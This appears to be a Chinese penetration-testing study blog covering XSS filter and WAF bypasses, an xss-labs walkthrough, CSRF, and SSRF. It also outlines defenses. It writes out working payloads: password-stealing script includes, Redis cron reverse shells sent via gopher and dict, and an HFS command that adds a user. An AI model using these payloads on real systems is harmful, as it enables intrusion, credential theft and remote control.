对于Java而言（ESAPI）：https://www.cnblogs.com/baixiansheng/p/9001522.html ESAPI是一个Apache开发的安全组件，首先应当配置过滤器（注意在过滤器中chain.doFilter(..)方法中的Request对象进行包装，在包装类中对请求参数进行筛选操作）。其次将过滤器注册到web.xml文件中；最后配置Request的包装类，在其中对请求信息进行过滤。 可以选择使用CSF(Content Security Policy)安全策略：CSF是一种白名单防御策略，所有不在名单内的资源都不被信任，有效的防止了通过外部的标签、脚本、JS文件等资源的入侵形式。 WAF HttpOnly的绕过 若浏览器未保存帐号密码 利用表单劫持，得到用户输入的账号密码，并抄送到XSS平台上去，再应用到XSS攻击中。 前提条件1：明文密码；前提条件2：XSS存在于登录框才行，比较鸡肋 若浏览器保存帐号密码 浏览器读取帐号密码。根据表单配置XSS平台，然后写入XSS代码。 确定注册时的表单属性信息： 在XSS平台创建一个项目，点击配置，选择获取浏览器保存的账号密码： 按照网站的表单信息填写相应的属性： 配置完成后，按照XSS平台提供的攻击语句在浏览器执行攻击，比如&lt;sCRiPt sRC=//xsshs.cn/9TUt&gt;&lt;/sCrIpT&gt;。 常规WAF绕过思路常见WAF过滤的标签： 12&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt; &lt;select&gt; 黑名单（大小写绕过）过滤单引号、双引号、&lt;、&gt;、on开头的单词等非法字符。 比如过滤script，但是没有考虑大小写： &lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt; 删除黑名单字段（重复数据绕过）尝试在 &lt;script&gt; 中再嵌套一个 &lt;script&gt;绕过： &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/SCRIPT&gt; 特殊符号干扰 引号闭合参数，不要&gt; 如果对&lt;&gt;进行了过滤，无法使用，可以用引号闭合链接（对于来自XSS平台的含有XSS的恶意链接）。 比如&lt;script src=&#39;https://xxs8.cc/xxxx&#39;是有可能成功攻击的。 /干扰 &lt;/img src=&quot;#&quot; onerror=&quot;javascript:alert(1)&quot;sbjkdsbfjeb#&gt; 标签语法替换使用代码 $name = preg_replace( &#39;/&lt;(.\\*)s(.\\*)c(.\\*)r(.\\*)i(.\\*)p(.\\*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )，.代表任意字符，*代表匹配前一个字符0或无限次。其中preg_replace 函数可以调用正则表达式，进行 script 的逐字检查，并通过 /i 来不区分大小写。 但是上述代码只考虑了script标签的XSS，其实 JS 脚本不仅仅可以在 &lt;script&gt; 标签中使用，通过 &lt;img&gt; 标签中 onerror 行为也可以调用 JS 脚本。 提交 &lt;img src=1 onerror=alert(document.cookie)&gt;，攻击成功。 也可尝试更多其他标签，比如&lt;a&gt;、&lt;svg&gt;、&lt;audio&gt;等。 字符长度限制绕过如果只是在浏览器前端进行的字符长度限制，那么要么禁用或者修改前端的相关JS脚本，要么绕过前端在 Burpsuite 中修改数据包就可以轻松绕过限制。 提交方式更改get不行，换post。 比如安全狗的部分拦截仅针对URL（get）进行检测。 更换为post提交后payload成功执行： 有时也可以选择 HTTP 头部进行注入： Referer表示本网页的上一个URL，这里的攻击语句首先使用引号闭合语法，然后定义type为text，使得alert(1)能够显示。 攻击成功，网页上出现弹框： 垃圾数据溢出在脚本末尾加上大量无关字符，导致过滤条件失效。注意最后要加上#注释、或者&#x2F;&#x2F;、或者–+，需要自己试（特殊符号干扰）。 比如&lt;script src=&#39;https://xxs8.cc/xxxx&#39;fhdhbgdioslbdvs#&gt; 编码转换（编码绕过）对输入到页面的数据进行编码转换，使得攻击语句的某些特殊字符被编码，攻击失效。 绕过时，对攻击语句也主动进行编码即可，网站发现这些字符已经被编码，会自动对某些编码进行解码。。 包括JS编码，HTML实体编码，URL编码。 JS编码 JS提供了四种编码策略： 三个八进制数字，如果个数不够，在前面补0，比如”e”的编码为”\\145”； 两个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\\x65”； 四个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\\u005”； 对于一些控制字符，使用特殊的C类型的转义风格。 HTML实体编码 命名实体：以&amp;开头，以分号结尾，例如&lt;的编码是&amp;lt;。 字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为&amp;#数值;，例如&lt;的编码是&amp;#060;和&amp;#x3c;。 URL编码 由于网页会对URL进行一次解码，所以使用URL编码绕过时有时需要进行两次编码。所以在使用编码测试时，需要考虑HTML的渲染顺序，选择合适的编码方式进行测试。 针对不同的WAF产品，有不同的编码绕过方法：https://bbs.pediy.com/thread-250852.htm 针对Cloudflare，使用无空格filler绕过：&lt;a&quot;/onclick=(confirm)()&gt;click\\ 针对Worldfence，使用数字符编码绕过：&lt;a/href=javascript&amp;colon;alert()&gt;click\\ 针对Barracuda，使用数字符编码绕过：&lt;a/href=&amp;#74;ava%0a%ed%09script&amp;colon;alert()&gt;click\\ 针对Akamai，使用黑名单中缺少的event handler;混淆函数调用：&lt;d3v/onauxclick-[2]. some(conf irm)&gt;click\\ 内置函数转义（难绕过）使用 htmlspecialchars 函数对提交的信息进行 转义。该函数会将所有特殊字符转义为 HTML 实体。比如把 &lt; 转义为 &amp;lt;，把 &gt; 转义为 &amp;gt;。只要正确的使用该函数，XSS 攻击就可以彻底杜绝。 实验https://github.com/do0dl3/xss-labs xss-labs通关大合集： https://blog.csdn.net/wo41ge/article/details/107459332、 https://blog.csdn.net/m0_62879498/article/details/123592092 level 1所输入name的值会回显在&lt;h2&gt;&lt;/h2&gt;中，因此直接插入script： 1?name=&lt;script&gt;alert(1)&lt;/script&gt; 上述语句是标准模板，后面的关卡均可以先输入上述内容，来判断所使用的防御手段。 level 2在&lt;h2&gt;&lt;/h2&gt;中的内容被实体编码了，但在Input中没有： 1&lt;input name=keyword value=&quot;ccb&quot;&gt; 因此在value中插入script，但是注意&quot;&gt;闭合以及注释。 1234?name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//// 效果如下&lt;input name=keyword value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&quot;&gt; level 3在&lt;h2&gt;&lt;/h2&gt;以及&lt;input&gt;中的内容均被实体编码，无法使用&lt;&gt;。 因此，使用&lt;input&gt;的特殊事件来触发script，input的&lt;&gt;可以不闭合。 1234?name=&#x27; onfocus=javascript:alert(1)//// 效果如下&lt;input name=keyword value=&#x27;&#x27; onfocus=javascript:alert(1)//&#x27;&gt; 输入后，再点击输入框即可出发onfocus事件。 level 4第三关的单引号闭合换为双引号。 level 5经过尝试，发现script、onfocus、οnmοuseοver 均被注释掉了。使用&lt;a&gt;标签。 1234?name=&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码&lt;input name=keyword value=&quot;&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt; level 6经过尝试，发现script和href均被过滤。使用大小写绕过。 1234?name=&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码&lt;input name=keyword value=&quot;&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt; level 7&lt;input&gt;的value值未被实体编码，但是若提交的内容中有script、href会被替换为空。双写绕过。 1?name=&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;ccb&lt;/a&gt; level 8引号、&lt;、&gt;均被实体编码，href、script又被过滤，只能使用编码绕过。 将javascript:alert(1)中的script转化为实体编码： 1java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) level 9在第8关的基础上，强制输入的内容要带有http://，不然报错。 1java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(`http://`) level 10页面上没有输入框，检查源码发现有三个&lt;input&gt;，尝试输入发现只有t_sort会回显。 123456?keyword=1&amp;t_sort=ccb?keyword=1&amp;t_sort=&quot; type=&quot;&quot; onclick= alert(`xss`)&gt;//// 效果如下&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;&quot; onclick= alert(`xss`)&gt;//&quot; type=&quot;hidden&quot;&gt; 输入后，再点击页面即可触发onclick事件。 level 11与第10关的区别是双引号、&lt;&gt;被实体编码了。 但是可以看到多了一个名为t_ref的input标签，该标签的值也无法通过get方法赋予。但是根据名称，猜测来自referer。抓包，修改referer，发现响应体中的t_ref确实与请求头的referer字段的值相同。 使用BP或者hackbar提交referer即可。 1234referer:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//// 效果如下&lt;input name=&quot;t_ref&quot; value=&quot;&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//&quot; type=&quot;hidden&quot;&gt; level 12与第11关原理相同，只不过回显的字段从Referer换成了User-Agent。 1User-Agent:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;// level 13与第11关原理相同，只不过回显的字段从Referer换成了Cookie。 1Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;// level 14https://blog.csdn.net/qq_40929683/article/details/120422266 level 15传入src参数的值会被用于ng-include。 1234?src=ccb// 查看页面html&lt;span class=&quot;ng-include:ccb&quot;&gt;&lt;/span&gt; ng-include指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。 ng-include如果单纯指定地址，必须要加引号 ng-include加载外部html，script标签中的内容不执行 ng-include加载外部html中含有style标签样式可以识别 ng-include 属性的值可以是一个表达式，返回一个文件名 默认情况下，包含的文件需要包含在同一个域名下。 尝试通用的攻击语句： 1?src=&quot;&lt;script&gt;alert(1)&lt;/script&gt; // 发现双引号被过滤，&lt;&gt;被实体编码，只能使用其他XSS语句 12// 加载同一域名下的外部文件level1.php，同时传入参数name?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; 这样该页面就会包含level1.php，并传入name参数&lt;img src=1 onerror=alert(1)&gt;&#39;，由于在解析src时出错，所以触发onerror。 level 16尝试如下语句： 123?keyword=&lt;script&gt;alert(1)&lt;/script&gt;?keyword=&lt;img src=1 οnerrοr=alert(&#x27;xss&#x27;) &gt; 发现script被注释，空格和&#x2F;均被转义。 尝试使用%0A替换空格： 1?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt; level 17-20flash XSS，与swf文件相关。 https://blog.csdn.net/qq_40929683/article/details/120422266","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"CSRF、SSRF","slug":"渗透测试/5.CSRF、SSRF","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:00:50.107Z","comments":true,"path":"posts/[object Object]/渗透测试/5.CSRF、SSRF/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.CSRF%E3%80%81SSRF/undefined","excerpt":"","text":"CSRF概念CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。利用了网站服务器只能检查发起请求的是不是用户的浏览器，而无法检查发起请求的是不是用户本意的这一漏洞。通常由于服务端没有对请求头做严格过滤引起的。 XSS利用的是站点内的信任用户，由信任用户执行了含有恶意前端脚本的页面产生，攻击对象是访问页面的用户。而CSRF则是通过搭建外部网站，受害者访问网站时被攻击者利用，通过盗取受害者身份，伪装来自受信任用户的请求来执行对受信任网站的攻击。 CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。我们知道，绝大多数网站是通过cookie等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过XSS或链接欺骗等途径（在XSS中嵌入CSRF的链接），让用户在本机（即拥有身份cookie的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。 可能出现该漏洞的地方： 存在添加、修改、删除操作的页面。 仅有查询的页面不会有该漏洞。 一般出现在中小型的网站，不属于严重漏洞。大型网站一般也比较安全，不会有这种漏洞。 分类CSRF(get)以pikachu靶场为例，在修改个人信息的页面点击提交。通过BP抓包可以看到所填写的个人信息是通过get方式提交的： 那么通过修改get请求中的信息，就可以构造含有自己信息的URL。然后写入自己网站中新建的html。当受害者 在登录状态下访问 这个html（外部网站）时就会执行该URL（请求伪造，将个人信息修改为了黑客伪造的内容），达到跨站请求伪造的目的。 或者也可以直接使用BP的CSRF功能，自动生成攻击用html。 复制出自动生成的攻击用html代码，修改其中个人信息的参数为自己的信息，然后另存为html 然后若受害者访问该html即可成功执行伪造的请求。 CSRF(post)网站以post请求提交修改信息： 写攻击页面，其中提交的信息为post请求格式： 接下来同样诱使用户访问我们自己写的恶意代码的网址即可。当用户再次返回时可以看到值已被修改。 危害篡改目标站点上的用户数据 盗取用户隐私数据 作为其他攻击的辅助攻击手法 传播 CSRF 蠕虫 挖掘请求直接是个GET&#x2F;POST请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。这种漏洞的检测方法很简单：网页操作某功能，抓包后，如果发现满足上面条件，然后没有referer验证，再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。 CSRF和XSS的区别 相同点： XSS、CSRF、SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。 不同点： XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。攻击发生在本站。 CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。攻击是跨站的。 SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。 防御强制用户输入密码当用户发送重要的请求时需要输入原始密码。 设置随机Token（最有效）服务器每次向客户端返回操作页面时都会给客户端产生一个随机的 Token 值，客户端在页面进行操作时需要携带该 Token，服务器如果检查发现用户携带的 Token 和它产生的不一样，就会判断为攻击行为，拒绝执行。 使用token比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 在每次请求中加入了不同的token，等攻击者再利用这个token时，这个token已经过期，无法成功攻击。 缺点： 难以给所有的请求都使用token。在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。 难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。当用户访问黑客在论坛上发表的这个网站时，系统也会在这个地址后面加上论坛的 token，于是黑客就可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。 当然，攻击者可以实现用恶意脚本获取用户的token，然后拦截客户的请求再把 Token 值插入到客户的请求包中。但是这些操作已经超出CSRF攻击的范围。 检验referer来源请求时判断请求链接是否为当前管理员正在使用的页面，要求 Referfer 必须是本服务器自己的主机名（同源检查）。比如： 12345if(stripos($_SERVER[&#x27;HTTP REFERER&#x27;], $_SERVER[&#x27;SERVER NAME&#x27;]) != false) &#123; //Get input $pass_new = $_GET[&#x27;password_new&#x27;]; $pass_conf = $_GET[&#x27;password_conf&#x27;];&#125; 比如，管理员在编辑文章，黑客发来恶意的修改密码的链接，因为修改密码页面管理员之前并没有在操作，所以攻击者诱骗受害者点击提交的请求中Referer 一定是空值，因此攻击失败。 局限性： 首先，referer是可以通过抓包进行修改的。 再者，检查 Refer 信息并不能防范来自本域的攻击。在企业业务网站上，经常会有同域的论坛，邮件等形式的 Web 应用程序存在，来自这些地方的 CSRF 攻击所携带的就是本域的 Refer 域信息，因此不能被这种防御手段所阻止。 同样，某些直接发送 HTTP 请求的方式（指非浏览器，比如用后台代码等方法）可以伪造一些 Refer 信息，虽然直接进行头信息伪造的方式属于直接发送请求，很难跟随发送 cookie，但由于目前客户端手段层出不穷，flash，javascript 等大规模使用，从客户端进行 refer 的伪造，尤其是在客户端浏览器安装了越来越多的插件的情况下已经成为可能了。 设置验证码限制请求只能为post在HTTP 头中自定义属性并验证不把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。 安全的会话管理(避免会话被利用) 不要在客户端端保存敏感信息(比如身份认证信息) ; 使页面关闭（退出）时会话过期； 设置会话过期机制，比如15分钟内无操作，则自动登录超时; 访问控制安全管理 敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码; 敏感信息的修改使用post ,而不是get ; 通过http头部中的referer来限制原页面 增加验证码：一般用在登录(防暴力破解)， 也可以用在其他重要信息操作的表单中(需要考虑可用性)。 &#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）概念SSRF(Server-Side Request Forgery：服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。攻击者向服务器上传恶意地址，服务器未对地址进行检查就直接访问，让目标服务器执行非本意的操作，造成了攻击。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。SSRF常被用于，探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问的主机。 产生原因SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如没有限制可以构建恶意访问的敏感协议头或内网访问资源权限。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。 SSRF与CSRF的区别？1.SSRF是服务端请求伪造，SSRF是诱导服务器访问，欺骗的是服务端（服务器） 2.CSRF是跨站请求伪造，CSRF是通过诱导用户点击，欺骗的是客户端（浏览器） SSRF的挖掘从web功能出发： URL分享：通过URL地址分享网页内容 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译（有道翻译ssrf漏洞）：通过URL地址翻译对应文本的内容 图片加载与下载（通过URL地址加载或下载图片）：通过URL地址加载或下载图片，比如上传头像 图片、文章收藏功能 网站采集、网页抓取的地方 一切要你输入网址的地方和可以输入ip的地方。 从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain SSRF的验证SSRF漏洞特点：一般通过构造URL来判断该网站是否存在SSRF 白盒测试 寻找可能构成SSRF漏洞的危险函数：file_get_contents()、fsockopen()、curl_exec()。 黑盒测试 （1）右键图片，看图片（或者其他资源）的URL是否为该网站的路径。如果该图片是其他服务器的地址，则可能存在SSRF漏洞。 （2）burpsuite抓包，查看网站请求消息报文中是否存在URL，URL请求的是否为内网IP。然后也可以尝试将URL更换为可能的内网地址（通过历史漏洞判断该web应用可能的内网地址），或者暴力拆解内网地址。 （3）DNS外带（常用于测试没有回显的网站）DNSlog平台测试（查询DNS解析过程） 排除法：浏览器f12查看源代码看是否是在本地进行了请求 比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 dnslog等工具进行测试，看是否被访问 可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址 从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址 通过二级域名暴力猜解工具模糊猜测内网地址 直接返回的Banner、title、content等信息 留意bool型SSRF 漏洞利用（危害可大可小） 内网探测：可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）； 比如输入http://192.168.64.144:3306进行探测。 攻击运行在内网或外网的有漏洞程序（比如溢出）； 向内部任意主机的任意端口发送精心构造的payload，主要是使用 GET 参数就可以实现的攻击（如Struts2漏洞，SQL注入）； 可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹（如readme文件）； 窃取本地和内网敏感数据：使用file://协议读取本地文件(或其他协议） 各个协议调用探针: http, file, dict, ftp, gopher等 漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等 探测内网主机：http://192.168.64.144/phpmyadmin/ **探测服务器文件file:///**：file:///c:/windows/win.ini，在有回显的情况下，利用 file 协议可以读取任意内容 探测内网服务（dict伪协议）web服务：dict://192.168.64.144:3306/info，会泄露安装软件版本信息，查看端口，操作内网redis服务等 123456dict://127.0.0.1:3360 （探测 MySQL 服务）如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。dict://127.0.0.1:22 （探测 SSH 服务）dict://127.0.0.1:6379 （探测 redis 服务）dict://127.0.0.1:1433 （探测 SQL server 服务） 探测内网主机的ftp是否开启：ftp://192.168.64.144:21 gopher伪协议 支持发出GET、POST请求，发送TCP数据，默认端口70 可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。 gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell。所有的WEB服务中间件都支持gopher协议，gopher可以发送任何的TCP数据包，常用于攻击redis服务（内存数据库——拿到该服务即是最高权限）。 gopher 的利用可以参考：http://t.zoukankan.com/beidaxmf-p-13935298.html、https://blog.csdn.net/qq_60115503/article/details/124407499。 123456利用gopher发起请求的一般步骤：1.构造HTTP的请求消息2.对请求消息进行URL编码3.对编码后的%0a替换成%0D%0a4.将替换后的数据再进行一次URL编码（双重URL编码）5.拼接协议头 各个脚本语言所支持的协议： 作为下一步攻击的跳板 比如使用ssrf探测内网主机，探查到有一台主机开放了8080端口： 发现该主机搭载了HFS。搜索HFS相关漏洞，发现https://blog.csdn.net/qq_45884775/article/details/124065484，存在RCE命令执行漏洞。payload为`http://127.0.0.1:8080/?search==%00{.exec|cmd.exe &#x2F;c [Command-String].}&#96;。 所以可以实施攻击，比如http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe /c net user test1234 1234 /add.&#125;添加用户。或者下载远程文件（下载木马），实施远控。 绕过安全防御：比如防火墙、CDN SSRF getshell利用Redis未授权访问getshellhttps://blog.csdn.net/weixin_39194641/article/details/102605354 https://blog.csdn.net/u012206617/article/details/108941738 利用redis写入定时反弹shell任务，用到了CRLF漏洞，url如下： 1234567891011编码前：http://192.168.31.78:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/set x &quot;\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.221.129/55555 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsaveaaa编码后：http://192.168.221.134:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/%0D%0A%0D%0Aset%20x%20%22%5cn*%2f1+*+*+*+*+bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.221.129%2f55555+0%3e%261%5cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa 本机监听并发送payload如下： netcat监听，得到了root权限的shell： 通过curl命令和gopher协议远程攻击内网redis使用gopher协议可以用来发送各种格式的请求包。 gopher协议可配合linux下的curl命令伪造POST请求包发给内网主机。 此种方法能攻击成功的前提条件是：redis是以root权限运行的。 payload如下： 123curl -v &#x27;http://xxx.xxx.xx.xx/xx.php?url=gopher://172.21.0.2:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27; redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送； payload采用的是bash反弹，定时程序路径是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 发送请求之前在公网机192.168.220.140开启nc监听端口2333 1nc -lvp 2333 （或nc -l 2333） 使用dict协议向Redis数据库写shellcurl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。 可通过以下三条命令看是否能利用dict： 123/xx.php?url=dict://172.21.0.2:6379/info/xx.php?url=dict://172.21.0.2:6379/get:user/xx.php?url=dict://172.21.0.2:6379/flushall 命令如下： 12345678910// 清除数据http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/flushall// 利用302跳转写入反弹命令http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/bhost=*.*.*.*%26bport=1234// 设置导出路径http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dir:/var/spool/cron/// 设置导出名字http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/config:set:dbfilename:root// 导出http://xxx.xxx.xx.xx/xx.php?url=dict://172.21.0.2:6379/save 在公网机上使用nc持续监听1234端口，等一会儿把包发完就会反弹shell。 SSRF漏洞相关函数和协议file_get_contents()file_get_content函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。支持php://input协议。file_get_contents的gopher协议不能URL编码。 1234&lt;?php$url = $_GET[&#x27;url&#x27;];;echo file_get_contents($url);?&gt; 比如，如下页面是通过file参数获得的URL链接请求得到的： 那么此处可以尝试将URL更换为恶意构造的URL，来达到SSRF攻击的目的。 比如访问服务器本地的readme文件： 甚至是通过本地文件传输协议file://来访问服务器的指定文件： 利用ssrf测试3306端口： fsockopen()fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限。 1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); // 打开socket连接 if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; // 以get请求获取目标数据 $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; curl_exec()curl_exec函数用于执行指定的CURL会话，默认不跟踪跳转。 123456789101112131415&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123; $link = $_POST[&#x27;url&#x27;]; $curlobj = curl_init();// 创建新的 cURL 资源 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); // CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项 curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项 $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器 curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源 $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; file_put_contents($filename, $result); echo $result;&#125;?&gt; SSRF常见种类 远程下载SSRF：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。 布尔型SSRF：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。 